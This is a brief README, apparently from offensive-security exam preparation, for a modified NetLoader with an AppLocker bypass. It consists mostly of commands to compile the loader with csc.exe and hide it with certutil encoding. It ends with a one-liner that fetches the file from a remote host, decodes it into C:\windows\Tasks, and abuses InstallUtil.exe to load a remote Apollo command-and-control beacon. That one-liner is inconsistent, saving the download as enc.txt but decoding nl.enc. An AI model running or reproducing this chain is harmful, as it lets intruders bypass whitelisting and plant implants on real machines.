# NetLoader
NetLoader mixed with AppLocker Bypass PowerShell Runspace.

Source code from:
- <https://github.com/Flangvik/NetLoader/tree/5a58cce49d07d1165a1768f46d85e449c4fc8503>
- <https://github.com/r4ulcl/Mythic-OSEP-CheatSheet/blob/main/scripts/utils/NetLoaderModified.cs>
- <https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/AppLocker%20Bypass%20PowerShell%20Runspace>

The file is compilled with:
```powershell
C:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:NL-mod.exe  /r:"C:\windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" .\NetLoader-mod.cs
```

And encoded with certutil.
```powershell
Certutil -encode NL-mod.exe nl.enc
```
*Note: Save the encoded file in `./Tools/NetLoader/nl.enc`.*


Finally executed with
```powershell
powershell iwr -uri http://192.168.235.130:8000/Tools/NetLoader/nl.enc -outfile C:\\windows\\Tasks\\enc.txt; powershell rm C:\\windows\\Tasks\\vns.exe; powershell certutil -decode C:\\windows\\Tasks\\nl.enc C:\\windows\\Tasks\\vns.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.235.130:8000/beacons/apollo.exe /U C:\\windows\\Tasks\\vns.exe
```

